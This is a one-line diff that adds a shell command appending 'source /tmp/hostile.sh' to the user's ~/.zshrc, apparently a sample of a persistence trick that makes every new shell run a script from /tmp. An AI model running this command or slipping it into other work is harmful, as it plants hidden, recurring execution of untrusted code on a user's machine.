@@ -1,0 +1,1 @@
+echo "source /tmp/hostile.sh" >> ~/.zshrc
